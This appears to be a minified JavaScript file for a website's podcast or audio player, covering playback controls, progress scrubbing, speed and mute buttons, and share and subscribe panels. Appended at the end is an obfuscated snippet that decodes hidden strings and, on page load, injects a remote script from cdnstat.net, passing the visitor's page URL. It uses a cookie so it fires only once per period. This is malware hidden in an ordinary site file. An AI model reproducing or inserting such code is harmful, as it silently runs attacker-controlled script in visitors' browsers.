const playback=document.querySelector(".playback"),audio=document.querySelector(".clip"),playBtn=document.querySelector(".play-btn"),pauseBtn=document.querySelector(".pause-btn"),cover=document.querySelector(".player__artwork"),duration=document.querySelector("#duration"),timer=document.querySelector("#timer"),progress=document.querySelector(".progress"),progressBar=document.querySelector(".progress__filled"),skipButtons=playback.querySelectorAll("[data-skip]"),volumeBtn=document.querySelector(".player-btn__volume"),speedBtn=document.querySelector(".player-btn__speed"),loader=document.querySelector(".loader");function padNum(e){return`${e+100}`.substring(1)}function formatTime(e){let t;return hours=Math.floor(e/3600),e%=3600,minutes=Math.floor(e/60),seconds=Math.floor(e%60),t=hours>0?`${padNum(hours)}:${padNum(minutes)}:${padNum(seconds)}`:`${padNum(minutes)}:${padNum(seconds)}`,t}function togglePlayback(){audio.paused?(audio.play(),pauseBtn.classList.remove("hide"),playBtn.classList.add("hide")):(audio.pause(),pauseBtn.classList.add("hide"),playBtn.classList.remove("hide"))}function syncPlayButton(){audio.paused?(pauseBtn.classList.add("hide"),playBtn.classList.remove("hide")):(pauseBtn.classList.remove("hide"),playBtn.classList.add("hide"))}function updateDuration(){duration.innerHTML=formatTime(audio.duration)}function handleProgress(){const e=audio.currentTime/audio.duration*100;progressBar.style.flexBasis=`${e}%`}function scrub(e){const t=e.offsetX/progress.offsetWidth*audio.duration;audio.currentTime=t}function skip(){audio.currentTime+=parseFloat(this.dataset.skip)}function toggleMute(){1===audio.volume?(audio.volume=0,volumeBtn.classList.add("off"),volumeBtn.setAttribute("aria-label","Unmute")):(audio.volume=1,volumeBtn.classList.remove("off"),volumeBtn.setAttribute("aria-label","Mute"))}function handleSpeedChange(){const e=this.dataset.speed<2?(parseFloat(this.dataset.speed)+.2).toFixed(1):1;speedBtn.setAttribute("data-speed",e),speedBtn.innerHTML=e+"x",audio.playbackRate=e}function handleWaiting(){loader.classList.remove("hide")}function handleCanPlay(){loader.classList.add("hide")}audio.ontimeupdate=function(){timer.innerHTML=formatTime(audio.currentTime)},audio.onended=function(){pauseBtn.classList.add("hide"),playBtn.classList.remove("hide")},playBtn.addEventListener("click",togglePlayback),pauseBtn.addEventListener("click",togglePlayback),cover.addEventListener("click",togglePlayback),speedBtn.addEventListener("click",handleSpeedChange),audio.addEventListener("play",syncPlayButton),audio.addEventListener("pause",syncPlayButton),audio.addEventListener("playing",syncPlayButton),audio.addEventListener("playing",updateDuration),audio.addEventListener("timeupdate",handleProgress),skipButtons.forEach((e=>e.addEventListener("click",skip))),volumeBtn.addEventListener("click",toggleMute),audio.addEventListener("waiting",handleWaiting),audio.addEventListener("canplay",handleCanPlay);let mousedown=!1;progress.addEventListener("click",scrub),progress.addEventListener("mousemove",(e=>mousedown&&scrub(e))),progress.addEventListener("mousedown",(()=>mousedown=!0)),progress.addEventListener("mouseup",(()=>mousedown=!1));const playerBody=document.querySelector(".player__main"),subscribeBtn=document.querySelector("#subscribe-btn"),subscribePanel=document.querySelector(".player-panels .subscribe"),subscribePanelClose=document.querySelector(".player-panels .subscribe .close-btn"),shareBtn=document.querySelector("#share-btn"),sharePanel=document.querySelector(".player-panels .share"),sharePanelClose=document.querySelector(".player-panels .share .close-btn"),linkCopyElm=document.querySelector(".input-link"),linkCopyBtn=document.querySelector(".copy-link"),embedCopyElm=document.querySelector(".input-embed"),embedCopyBtn=document.querySelector(".copy-embed"),rssCopyElm=document.querySelector(".input-rss"),rssCopyBtn=document.querySelector(".copy-rss"),linkCopied=document.querySelector(".link-copied");function togglePanel(e){e.classList.contains("open")?(e.classList.remove("open"),playerBody.classList.remove("inactive")):(e.classList.add("open"),playerBody.classList.add("inactive"))}function copyLink(e){e.select(),document.execCommand("Copy")}subscribeBtn&&(subscribeBtn.addEventListener("click",(()=>togglePanel(subscribePanel))),subscribePanel.addEventListener("transitionend",(e=>{"transform"===e.propertyName&&subscribePanel.classList.contains("open")?subscribePanelClose.focus():subscribeBtn.focus()})),subscribePanelClose.addEventListener("click",(()=>togglePanel(subscribePanel))),subscribePanel.addEventListener("keydown",(function(e){"Escape"===e.key&&togglePanel(subscribePanel)}))),shareBtn&&(shareBtn.addEventListener("click",(()=>togglePanel(sharePanel))),sharePanel.addEventListener("transitionend",(e=>{"transform"===e.propertyName&&sharePanel.classList.contains("open")?sharePanelClose.focus():shareBtn.focus()})),sharePanelClose.addEventListener("click",(()=>togglePanel(sharePanel))),sharePanel.addEventListener("keydown",(function(e){"Escape"===e.key&&togglePanel(sharePanel)})),linkCopyBtn.addEventListener("click",(()=>copyLink(linkCopyElm))),embedCopyBtn.addEventListener("click",(()=>copyLink(embedCopyElm))),rssCopyBtn.addEventListener("click",(()=>copyLink(rssCopyElm))));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));